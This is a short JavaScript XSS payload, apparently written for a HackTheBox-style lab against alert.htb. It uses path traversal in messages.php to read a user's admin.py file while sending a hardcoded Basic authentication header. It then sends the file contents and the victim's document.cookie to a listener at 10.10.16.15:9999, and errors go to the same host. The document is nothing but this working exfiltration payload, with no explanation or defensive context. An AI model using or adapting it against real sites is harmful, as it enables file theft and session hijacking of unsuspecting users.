<script>
  var readfile="http://alert.htb/messages.php?file=../../../../home/david/admin.py";
  var test="http://statistics.alert.htb/"
  fetch(readfile,{headers:{'Host':'statistics.alert.htb',"Authorization":"Basic YWxiZXJ0Om1hbmNoZXN0ZXJ1bml0ZWQ="}})
    .then(response => response.text()) // Convert the response to text
    .then(data => {     
      fetch("http://10.10.16.15:9999/?data=" + encodeURIComponent(data)+"&cookie="+document.cookie);
    })
    .catch(error => fetch("http://10.10.16.15:9999/?err="+error.message));
</script>
